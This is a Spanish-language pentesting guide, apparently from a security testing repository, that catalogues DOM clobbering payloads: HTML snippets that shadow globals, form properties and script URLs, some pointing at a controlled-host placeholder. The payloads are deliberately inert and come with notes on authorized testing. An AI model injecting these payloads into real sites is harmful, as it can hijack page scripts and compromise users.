# 🗡️ DOM clobbering: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Globales por id y name

```html
<a id="configPrueba" href="#clobber-123">marca</a>
<form name="configPrueba"><input value="clobber-123"></form>
<iframe name="marcoPrueba" srcdoc="<p>clobber-123</p>"></iframe>
```

**Cuándo usarlo:** Probar cada elemento por separado e inspeccionar window.configPrueba o window.marcoPrueba. La exposición de un global no basta sin gadget.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).


## 🧭 Payloads por contexto

### Colección de anchors y propiedad

```html
<a id="someObject"></a><a id="someObject" name="url" href="https://{HOST_CONTROLADO}/inerte.js"></a>
<a id="defaultAvatar"></a><a id="defaultAvatar" name="avatar" href="https://{HOST_CONTROLADO}/imagen-canary.svg"></a>
```

**Cuándo usarlo:** La colección DOM puede sombrear someObject.url o defaultAvatar.avatar. Requiere código que use esa propiedad; servir recursos inertes propios.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).


### Propiedades de form sombreadas

```html
<form id="formPrueba"><input name="submit" value="clobber-123"></form>
<form id="formPrueba"><input name="action" value="clobber-123"></form>
<form id="formPrueba" onclick="document.documentElement.dataset.clobber=123"><input id="attributes"></form>
```

**Cuándo usarlo:** Submit, action y attributes son propiedades diferentes. La tercera exige un sanitizador cliente vulnerable y una interacción de prueba.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).


## 🔥 Payloads avanzados

### Tres niveles y RadioNodeList

```html
<form id="configPrueba" name="ruta"><input id="marcaPrueba" value="clobber-123"></form><form id="configPrueba"></form>
<form id="configPrueba"><input id="ruta" name="marcaPrueba" value="clobber-123"><input id="ruta"></form>
```

**Cuándo usarlo:** El primer caso prueba configPrueba.ruta.marcaPrueba; el segundo una colección de controles homónimos. Confirmar en navegador objetivo, especialmente Chrome.

**Fuente:** [PortSwigger](https://portswigger.net/research/dom-clobbering-strikes-back).


### Iframe como global encadenado

```html
<iframe name="marcoPrueba" srcdoc="<a id='configPrueba' href='https://{HOST_CONTROLADO}/marca'>prueba</a>"></iframe>
<iframe name="marcoPrueba" srcdoc="<form id='configPrueba'><input name='ruta' value='clobber-123'></form>"></iframe>
```

**Cuándo usarlo:** Probar cada iframe por separado: srcdoc hereda origen sin sandbox y puede exponer marcoPrueba.configPrueba o su ruta. Requiere un gadget real.

**Fuente:** [PortSwigger](https://portswigger.net/research/dom-clobbering-strikes-back).


### ID duplicado antes del nodo legítimo

```html
<div id="cdnDomain" style="display:none">clobber-123</div>
<span id="cdnDomain" hidden>clobber-123</span>
```

**Cuándo usarlo:** Alternativas independientes: inyectar antes del elemento legítimo si el script usa document.getElementById(...).innerText. Confirmar orden y sink.

**Fuente:** [PortSwigger](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering).


## 🔬 Pruebas guiadas por escenario

### 1. ID como global implícito

**Objetivo:** Comprobar si un nodo propio se expone como window.configPrueba.

```html
<a id="configPrueba" href="#prueba-123">marcador</a>
```

**Interpretación:** Observar typeof window.configPrueba; solo hay hallazgo si el JavaScript del sitio lo usa como configuración.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).

### 2. name como global

**Objetivo:** Probar exposición mediante name en un elemento permitido.

```html
<form name="configPrueba"><input value="prueba-123"></form>
```

**Interpretación:** Verificar si window.configPrueba resuelve al formulario y si interfiere con un global esperado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).

### 3. Colección de anchors

**Objetivo:** Sobrescribir una propiedad de objeto mediante dos elementos con el mismo id.

```html
<a id="someObject"></a><a id="someObject" name="url" href="https://{CONTROLLED_HOST}/marcador.js"></a>
```

**Interpretación:** Este patrón requiere código que use someObject.url como fuente de script o recurso; una colección DOM sola no basta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).

### 4. Método submit sombreado

**Objetivo:** Comprobar si un input homónimo cambia la propiedad form.submit.

```html
<form id="formPrueba"><input name="submit" value="prueba-123"></form>
```

**Interpretación:** En DevTools, typeof formPrueba.submit puede dejar de ser function; el impacto depende de un uso real del método.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).

### 5. Atributo de sanitizador sombreado

**Objetivo:** Reproducir en laboratorio el patrón documentado de properties clobbered.

```html
<form onclick="document.body.dataset.clobber=123"><input id="attributes">Prueba</form>
```

**Interpretación:** Solo aplica a un sanitizador cliente que itera element.attributes sin validar el tipo; confirmar ejecución controlada.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).

### 6. Propiedad action de formulario

**Objetivo:** Medir colisión con propiedad de un formulario antes de buscar un gadget.

```html
<form id="formPrueba" action="/seguro"><input name="action" value="prueba-123"></form>
```

**Interpretación:** Comparar formPrueba.action con el atributo action; no inferir redirección ni exfiltración sin un uso posterior.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering).

### 7. Tres niveles con form

**Objetivo:** Comprobar la cadena de propiedades HTMLCollection.form.input en Chrome.

```html
<form id="configPrueba" name="ruta"><input id="marcaPrueba" value="prueba-123"></form><form id="configPrueba"></form>
```

**Interpretación:** En Chrome, inspeccionar window.configPrueba.ruta.marcaPrueba.value. Otros navegadores pueden resolver distinto; requiere un gadget que use la cadena.

**Fuente técnica:** [PortSwigger](https://portswigger.net/research/dom-clobbering-strikes-back).

### 8. RadioNodeList en formulario

**Objetivo:** Probar dos controles homónimos que forman una colección bajo un form propio.

```html
<form id="configPrueba"><input id="ruta" name="marcaPrueba" value="prueba-123"><input id="ruta"></form>
```

**Interpretación:** En Chrome, inspeccionar configPrueba.ruta y sus métodos de colección; exige un gadget que use la propiedad heredada.

**Fuente técnica:** [PortSwigger](https://portswigger.net/research/dom-clobbering-strikes-back).

### 9. Iframe name y global interno

**Objetivo:** Comprobar cadena de nombres entre ventana padre y srcdoc del mismo origen.

```html
<iframe name="marcoPrueba" srcdoc="<a id='configPrueba' href='https://{CONTROLLED_HOST}/marca'>prueba</a>"></iframe>
```

**Interpretación:** Inspeccionar window.marcoPrueba.configPrueba tras cargar el iframe; depende de navegador y de que el HTML inyectado permita iframe.

**Fuente técnica:** [PortSwigger](https://portswigger.net/research/dom-clobbering-strikes-back).

### 10. ID duplicado antes de elemento legítimo

**Objetivo:** Probar una lectura document.getElementById que toma el primer elemento con ID repetido.

```html
<div id="cdnDomain" style="display:none">prueba-123</div>
```

**Interpretación:** Solo aplica si se inyecta antes del nodo legítimo y un script usa su innerText; demostrar el sink sin alterar recursos ajenos.

**Fuente técnica:** [PortSwigger](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
